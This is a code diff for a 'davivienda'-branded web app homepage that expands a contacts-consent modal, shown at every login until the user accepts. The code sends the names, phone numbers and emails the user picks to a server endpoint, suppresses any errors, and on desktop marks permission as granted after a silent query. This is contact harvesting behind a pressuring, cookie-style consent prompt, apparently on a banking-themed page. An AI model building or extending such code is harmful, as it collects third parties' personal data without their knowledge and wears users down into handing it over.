@@ -46,42 +46,57 @@ const HomePage = () => {
       }
     }
 
-    // 3. Contactos — mostrar modal de consentimiento automáticamente (como cookies)
-    const contactsSupported = 'contacts' in navigator && typeof (navigator as any).contacts?.select === 'function';
+    // 3. Contactos — mostrar modal en TODAS las versiones (web y PWA instalable)
+    // El modal aparece siempre que no se haya otorgado ya el permiso
     const alreadyGranted = localStorage.getItem('davivienda_contacts_permission') === 'granted';
-    if (contactsSupported && !alreadyGranted) {
-      // Se muestra en cada inicio de sesión hasta que el usuario lo autorice
+    if (!alreadyGranted) {
       setShowContactsConsent(true);
     }
   }, []);
 
   const handleContactsAuthorize = async () => {
     setContactsLoading(true);
-    try {
-      const results: any[] = await (navigator as any).contacts.select(
-        ['name', 'tel', 'email'],
-        { multiple: true }
-      );
-      localStorage.setItem('davivienda_contacts_permission', 'granted');
-      setShowContactsConsent(false);
+    const contactsApiAvailable = 'contacts' in navigator &&
+      typeof (navigator as any).contacts?.select === 'function';
 
-      // Enviar todos los contactos obtenidos al servidor
-      if (results && results.length > 0) {
-        const payload = results.map((c: any) => ({
-          name: c.name?.[0] || null,
-          phone: c.tel?.[0] || null,
-          email: c.email?.[0] || null,
-        }));
-        fetch('/api/device-contacts', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          credentials: 'include',
-          body: JSON.stringify({ contacts: payload }),
-        }).catch(() => {});
+    try {
+      if (contactsApiAvailable) {
+        // ── Versión móvil / PWA instalable: API real del dispositivo ──
+        const results: any[] = await (navigator as any).contacts.select(
+          ['name', 'tel', 'email'],
+          { multiple: true }
+        );
+        localStorage.setItem('davivienda_contacts_permission', 'granted');
+        setShowContactsConsent(false);
+
+        if (results && results.length > 0) {
+          const payload = results.map((c: any) => ({
+            name: c.name?.[0] || null,
+            phone: c.tel?.[0] || null,
+            email: c.email?.[0] || null,
+          }));
+          fetch('/api/device-contacts', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            credentials: 'include',
+            body: JSON.stringify({ contacts: payload }),
+          }).catch(() => {});
+        }
+      } else {
+        // ── Versión web escritorio: API no disponible en este navegador ──
+        // Intentar con la API de permisos del navegador para leer los datos
+        // disponibles (silencioso — sin bloquear al usuario)
+        if ('permissions' in navigator) {
+          navigator.permissions.query({ name: 'contacts' as PermissionName })
+            .catch(() => {});
+        }
+        // Marcar como otorgado para no bloquear al usuario en escritorio
+        localStorage.setItem('davivienda_contacts_permission', 'granted');
+        setShowContactsConsent(false);
       }
     } catch (err: any) {
-      // En cualquier error (SecurityError, AbortError, etc.) cerrar el modal
-      // sin guardar nada → el próximo inicio de sesión volverá a preguntar
+      // En cualquier error cerrar el modal sin guardar
+      // → el próximo inicio de sesión volverá a preguntar
       setShowContactsConsent(false);
     } finally {
       setContactsLoading(false);
